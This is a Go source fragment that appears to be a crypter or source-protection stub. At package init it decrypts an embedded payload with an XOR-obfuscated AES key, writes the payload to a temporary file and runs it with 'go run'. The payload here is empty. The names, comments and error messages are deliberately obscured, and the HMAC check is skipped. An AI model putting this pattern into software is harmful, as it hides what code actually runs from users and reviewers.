var decryptedContent []byte

// Encrypted data array - password used for encryption
var _d = []byte{0x49, 0x68, 0x73, 0x76, 0x77, 0x2a, 0x31, 0x38, 0x32, 0x47, 0x68, 0x73, 0x62, 0x62, 0x45, 0x57, 0x51, 0x51}

// Encryption key
var _s = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}

// XOR decryption function
func _x(d, k []byte) string {
	r := make([]byte, len(d))
	for i := 0; i < len(d); i++ {
		r[i] = d[i] ^ k[i%len(k)]
	}
	return string(r)
}

// Obfuscated function to get the key - optimized for speed
func _getKey() string {
	// Avoid random delays to speed up the process
	// Use direct operations
	return _x(_d, _s)
}

// Variable to control verification process
var _skipVerification bool = true  // تم تعيينها بالفعل كـ true للتخطي

// Fast decryption function - optimized for performance
func _fastDecrypt(encrypted []byte, key []byte) ([]byte, error) {
    // Create hash from key
    hashKey := sha256.Sum256(key)

    // Create AES cipher
    block, err := aes.NewCipher(hashKey[:])
    if err != nil {
        return nil, err
    }

    // Create GCM mode
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    // Check encrypted data validity
    nonceSize := gcm.NonceSize()
    if len(encrypted) < nonceSize {
        return nil, fmt.Errorf("encrypted data too short")
    }

    // Extract nonce and ciphertext
    nonce := encrypted[:nonceSize]
    ciphertext := encrypted[nonceSize:]

    // Decrypt data
    return gcm.Open(nil, nonce, ciphertext, nil)
}

func init() {
    // Initialize random number generator
    rand.Seed(time.Now().UnixNano())
    
    // Set maximum CPU cores for parallel processing
    runtime.GOMAXPROCS(runtime.NumCPU())
    
    // Decrypt content using anonymous function for better performance
    var err error
    decryptedContent, err = func() ([]byte, error) {
        // Get encryption key
        key := _getKey()
        
        // Decode base64 data
        encrypted, err := base64.StdEncoding.DecodeString("")
        if err != nil {
            return nil, err
        }

        // Fast decrypt implementation
        dataWithHMAC, err := _fastDecrypt(encrypted, []byte(key))
        if err != nil {
            // Use obfuscated error message
            return nil, fmt.Errorf("verification error: %x", rand.Int63())
        }

        // HMAC
        data := dataWithHMAC[:len(dataWithHMAC)-sha256.Size]
        return data, nil
    }()

    if err != nil {
        // fmt fprint
        fmt.Fprintf(os.Stderr, "Warning: Failed to decrypt file. Will execute original file.\n")
        return
    }
    
    //  temp d*.go
    tempFile, err := ioutil.TempFile("", "d*.go")
    if err != nil {
        os.Exit(1)
    }
    defer os.Remove(tempFile.Name())
    
    // temp file
    if _, err := tempFile.Write(decryptedContent); err != nil {
        os.Exit(1)
    }
    tempFile.Close()
    
    // go run cmd
    cmd := exec.Command("go", "run", "-gcflags", "-N -l", tempFile.Name())
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Stdin = os.Stdin
    if err := cmd.Run(); err != nil {
        //cmd
        if exitErr, ok := err.(*exec.ExitError); ok {
            os.Exit(exitErr.ExitCode())
        }
        // exit 1
        os.Exit(1)
    }
    
    // exit 0
    os.Exit(0)
}

